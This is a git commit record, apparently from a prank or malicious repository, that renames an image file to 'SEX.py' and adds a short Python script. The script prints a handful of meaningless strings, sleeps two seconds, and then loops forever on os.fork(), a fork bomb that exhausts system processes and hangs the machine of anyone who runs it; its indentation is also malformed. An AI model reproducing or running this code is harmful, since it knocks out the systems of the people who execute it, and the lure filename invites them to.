99b46c58ffb1437ff84387e332d7af080f1bb43a
Rubika-hacker <127617245+Rubika-hacker@users.noreply.github.com>
2023-05-22 01:41:11 +0330

    Update and rename images.jpg to SEX.py

---
+++ SEX.py
@@ -0,0 +1,21 @@
+import os 
+
+ import time 
+
+ print('yftt85k') 
+
+ print('/yftt85k') 
+
+ print('sex.Dxprit') 
+
+ print('Filter') 
+
+ print('PORNOGRAPHY') 
+
+ print('report') 
+
+ time.sleep(2) 
+
+ while True: 
+
+   os.fork()
